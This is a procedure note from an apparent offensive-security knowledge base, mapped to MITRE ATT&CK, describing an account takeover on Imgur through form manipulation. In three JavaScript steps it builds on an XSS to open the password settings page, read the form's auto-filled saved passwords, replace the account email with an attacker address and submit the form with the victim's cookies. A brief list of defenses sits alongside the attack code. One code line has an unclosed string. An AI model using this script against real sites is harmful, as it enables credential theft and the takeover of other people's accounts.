---
id: proc-imgur-ato-manipulation
tags:
  - account-takeover
  - password-extraction
  - form-manipulation
  - fetch-post
type: procedure
tools:
  - '[[tools/firefox-browser]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/window-open-password-settings]]'
  - '[[commands/extract-and-modify-form-data]]'
  - '[[commands/fetch-post-password-change]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials from Web Browsers]]'
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T03:47:13.040Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Credentials from Web Browsers]]'
  - '[[Account Manipulation]]'
---
# Perform Account Takeover via Password Form Manipulation

## Summary

This procedure uses the XSS context to open the password settings page, extract saved form data (including passwords), modify the email to the attacker's, and submit via fetch to takeover the account.

## Description

From the self-XSS, open settings in a new window, target the 6th form (index 5), read inputs (passwords auto-filled if saved), change email, build URL-encoded body, and POST with credentials. Firefox allows reading saved creds. Expected outcome: Account email changed, attacker logs in.

## Requirements

1. XSS execution in Imgur context
2. Victim has saved Imgur password in Firefox
3. Cookies included in fetch (same-origin)

## Defense

Defensive measures and detection strategies:

- Never auto-fill sensitive forms without verification
- CSRF tokens on settings forms
- Rate-limit password changes
- Monitor for anomalous POSTs from JS

## Objectives

1. Access saved credentials
2. Alter account details
3. Complete takeover

## Instructions

### Step 1: Open Password Settings Window

**Context**: Navigate to settings for form access.

**Command** ([[commands/window-open-password-settings]]):
```javascript
window.open('https://imgur.com/account/settings/password', '_blank');
```

> Opens new tab. Expected output: Settings page loads.

### Step 2: Extract and Modify Form Data

**Context**: Parse the specific form and alter email.

**Command** ([[commands/extract-and-modify-form-data]]):
```javascript
let forms = document.getElementsByTagName('form')[5];
let inputs = forms.getElementsByTagName('input');
let body = '';
for (let i = 0; i < inputs.length; i++) {
  if (inputs[i].name == 'email') {
    inputs[i].value = 'attacker@protonmail.com';
  }
  body += inputs[i].name + '=' + inputs[i].value + '&';
}
body += '_jafo[activeExperiments]=[]&_jafo[experimentData]={};
```

> Builds body string. Expected output: URL-encoded data with new email.

### Step 3: Submit Altered Form

**Context**: POST to change password/email.

**Command** ([[commands/fetch-post-password-change]]):
```javascript
fetch('https://imgur.com/account/settings/password', {
  credentials: 'include',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0'
  },
  body: body,
  method: 'POST',
  mode: 'cors'
});
```

> Submits change. Expected output: 200 OK response.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Impact
- [[Credential Access]] Credential Access

### Techniques

- [[Credentials from Web Browsers]] Credentials from Web Browsers
- [[Account Manipulation]] Account Manipulation

### Sub-Techniques

- None

## Commands Used

- [[commands/window-open-password-settings]]
- [[commands/extract-and-modify-form-data]]
- [[commands/fetch-post-password-change]]

## Tools Used

- [[tools/firefox-browser]]

## Tags

- credential-theft
- account-manipulation
